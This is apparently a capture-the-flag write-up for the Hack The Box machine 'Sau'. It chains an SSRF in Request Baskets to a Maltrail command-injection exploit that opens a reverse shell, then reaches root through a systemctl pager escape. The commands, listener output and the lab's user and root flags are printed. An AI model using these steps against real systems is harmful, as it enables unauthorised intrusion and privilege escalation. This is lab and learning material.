---
title: "sau from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# sau from HTB
[page](https://app.hackthebox.com/machines/Sau)
`Nmap`gave this:
```bash
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
7080/tcp  filtered empowerid
8338/tcp  filtered unknown
19667/tcp filtered unknown
34980/tcp filtered ethercat
55555/tcp open     unknown
```
`80 port`is filtered so we can't access it. Only open port is `55555`and let's access it.
Accessing the site we see that it is a `request basket`site and version is `1.2.1`. Quick search shows that this version is vulnerable to `ssrf`. We can access the `80 port`with this vulnerability.
1. Create basket
2.  click `Open Basket`
3. Click `settings logo`
4. And in `Forward URL`type: `127.0.0.1:80`So When we open the basket we will be forwarded to the `80 port`.
5. Check last two things: `Proxy Response` and `Expand Forward Path`
6. Click `Apply`
Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in `forward_url` are passed back to clients of original requests. The configuration of basket responses is ignored in this case.
Expand Forward Path - With this, the forward URL path will be expanded when original HTTP request contains a compound path.
After that instead of accessing the `<ip>:80` type `<ip>:55555/<basked id>`.
For me it is like this:
```
http://10.10.11.224:55555/vnjie7d
```
Checking the site we see that it is powered by
```
Maltrail (v0.53)
```
After searching a bit i got to this `github repository`which grants me an reverse shell:
https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main
```
python3 exploit.py [listening_IP] [listening_PORT] [target_URL]
```
Fill this with your `IP PORT and website URL`
For example:
```python
python3 exploit.py 10.10.16.2 1234 http://10.10.11.224:55555/dtfhpmh
```
This got me Connection:
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.224] 59542
$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
$ cat /home/puma/user.txt
aacebf2e57c90a4492e782dee743ff6d
```
***
User Flag is: aacebf2e57c90a4492e782dee743ff6d
***
With root permission i can run `systemctl`.
```bash
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
Check the version `always` because of version it is vulnerable
After quick search i got to this site which showed me how to do `privilege escalation with systemctl`: https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7

```bash
sudo /usr/bin/systemctl status trail.service
# after it stops typing, You need to type !sh
.................
..............
!sh

# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
e8b95f603e7b22e2f257d5975fdd1b52
```
***
Root Flag is: e8b95f603e7b22e2f257d5975fdd1b52
***
![](/assets/images/Screenshot from 2024-08-09 20-49-48.png)
